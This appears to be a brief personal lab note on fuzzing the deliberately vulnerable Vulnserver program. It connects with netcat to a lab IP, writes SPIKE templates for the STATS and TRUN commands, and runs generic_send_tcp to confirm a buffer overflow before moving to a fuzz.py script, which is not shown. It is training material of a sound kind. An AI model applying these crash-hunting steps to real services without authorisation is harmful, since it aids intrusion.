
Using vulnserver  

![](img/Pasted%20image%2020260321100040.png)  

Launch immunity debbuger  

![](img/Pasted%20image%2020260321100226.png)  

Attach vulnserver process and click run  
![](img/Pasted%20image%2020260321100412.png)  

From parrot:  
**nc -nv 10.10.1.11 9999**  

![](img/Pasted%20image%2020260321100845.png)  

Generate spike templates and perform spiking  
pluma stats.spk  

**s_readline();**  

**s_string("STATS ");**  

**s_string_variable("0");**  

![](img/Pasted%20image%2020260321101242.png)  

in parrot terminal run run **generic_send_tcp 10.10.1.11 9999 stats.spk 0 0**  

![](img/Pasted%20image%2020260321101403.png)  
![](img/Pasted%20image%2020260321101421.png)If the Immunity debbuger status is running means its not vulnerable to that type buffer overflow  

Buffer overflow with TRUN function  
**s_readline();**  
**s_string("TRUN ");**  
**s_string_variable("0");**  

**generic_send_tcp 10.10.1.11 9999 trun.spk 0 0**  

![](img/Pasted%20image%2020260321103657.png)  

![](img/Pasted%20image%2020260321103722.png)  


Now as the buffer overflow is confirmed need to perform fuzzing  

use fuzz.py (chmod +x)  


![](img/Pasted%20image%2020260321104113.png)  

